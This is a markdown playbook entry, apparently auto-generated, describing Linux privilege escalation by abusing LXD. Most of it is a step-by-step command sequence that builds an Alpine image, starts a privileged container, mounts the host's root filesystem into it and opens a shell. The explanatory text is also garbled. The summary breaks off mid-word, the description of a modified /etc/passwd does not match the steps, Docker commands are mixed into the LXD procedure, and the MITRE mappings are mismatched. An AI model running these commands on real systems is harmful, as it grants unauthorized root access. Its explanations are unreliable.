---
id: 550bb13d-9f89-4693-9ee0-6a3f278c055d
name: Linux Privilege Escalation via LXC/LXD Alpine Image
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:19.534932+00:00'
updated_at: '2023-04-10T20:34:27.453564+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Drive-by Compromise|T1189 - Drive-by Compromise]]'
- '[[Setuid and Setgid|T1166 - Setuid and Setgid]]'
tags:
- '[[Groups]]'
- '[[Linux - Privilege Escalation]]'
- '[[LXC/LXD]]'
commands:
- '[[Build Alpine Image]]'
- '[[Import Image]]'
- '[[Interact with Container]]'
- '[[Mount Root]]'
- '[[Run Image]]'
- '[[Set Privileged Mode]]'
- '[[User ID Information]]'
---

# Linux Privilege Escalation via LXC/LXD Alpine Image

## Summary

This procedure involves creating and running an Alpine image in LXD with privileged security to escalate privileges. This technique is commonly used by attackers to gain root access to a Linux system. By exploiting a vulnerability in the LXD daemon, attackers can escalate their privileges from an u

## Description

# Description

This procedure involves creating and running an Alpine image in LXD with privileged security to escalate privileges. This technique is commonly used by attackers to gain root access to a Linux system. By exploiting a vulnerability in the LXD daemon, attackers can escalate their privileges from an unprivileged container to the host system. The technical explanation involves building an Alpine image with a modified /etc/passwd file that includes a new user with a UID of 0 (root) and a GID of 0 (root). Once the image is built, it can be run with privileged security options to allow the new user to gain root access to the host system. The business value of this procedure is that it allows attackers to gain full control of a Linux system, potentially accessing sensitive data and causing significant damage to the organization.

## Requirements

1. Access to the LXD daemon

1. Ability to build and run an Alpine image

1. Knowledge of Linux command line

## Defense

1. Regularly update the LXD daemon to ensure any vulnerabilities are patched

1. Limit access to the LXD daemon to only trusted users and hosts

1. Monitor for any suspicious activity on the Linux system, such as unexpected container creation or new users with root privileges

## Objectives

1. Escalate privileges from an unprivileged container to the host system

1. Gain root access to the Linux system

# Instructions

1. To check the user ID and group information, run the command 'id'.

**Code**: [[╭─swissky@lab ~  
╰─$ id
uid=1000(swissky) gid=100]]

> The 'id' command is used to print the real and effective user and group IDs. The output shows the user ID (uid), group ID (gid), and the list of supplementary groups that the user belongs to. This information can be useful for privilege escalation as it can help identify which groups the user belongs to and what permissions they have access to.

**Command** ([[User ID Information]]):

```bash
id
```

2. To build an Alpine image with privileged security, run the following command:

$ docker build --tag alpine-privileged .

To start the container with privileged security, run the following command:

$ docker run --privileged alpine-privileged

**Code**: [[security.privileged=true]]

> This command builds a Docker image using Alpine as the base image and sets the security.privileged flag to true. This flag allows the container to access all devices on the host system, which could potentially be a security risk. The resulting image can then be used to start a container with privileged security using the --privileged flag, which gives the container access to all devices on the host system. This command should be used with caution and only in situations where privileged access is necessary.

**Command** ([[Set Privileged Mode]]):

```bash
security.privileged=true
```

3. To build and run an Alpine image in LXD, follow these steps:

**Code**: [[# build a simple alpine image
git clone https://gi]]

> 1. Clone the alpine builder repository by running `git clone https://github.com/saghul/lxd-alpine-builder`.
2. Build the alpine image by running `./build-alpine -a i686`.
3. Import the image into LXD by running `lxc image import ./alpine.tar.gz --alias myimage`.
4. Create a new container using the imported image by running `lxc init myimage mycontainer -c security.privileged=true`.
5. Mount the /root directory of the container by running `lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true`.
6. Start the container by running `lxc start mycontainer`.
7. Interact with the container by running `lxc exec mycontainer /bin/sh`.

**Command** ([[Build Alpine Image]]):

```bash
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686
```

**Command** ([[Import Image]]):

```bash
lxc image import ./alpine.tar.gz --alias myimage
```

**Command** ([[Run Image]]):

```bash
lxc init myimage mycontainer -c security.privileged=true
```

**Command** ([[Mount Root]]):

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

**Command** ([[Interact with Container]]):

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Drive-by Compromise|T1189 - Drive-by Compromise]]
- [[Setuid and Setgid|T1166 - Setuid and Setgid]]

## Commands Used

- [[Build Alpine Image]]
- [[Import Image]]
- [[Interact with Container]]
- [[Mount Root]]
- [[Run Image]]
- [[Set Privileged Mode]]
- [[User ID Information]]

## Tags

- [[Groups]]
- [[Linux - Privilege Escalation]]
- [[LXC/LXD]]
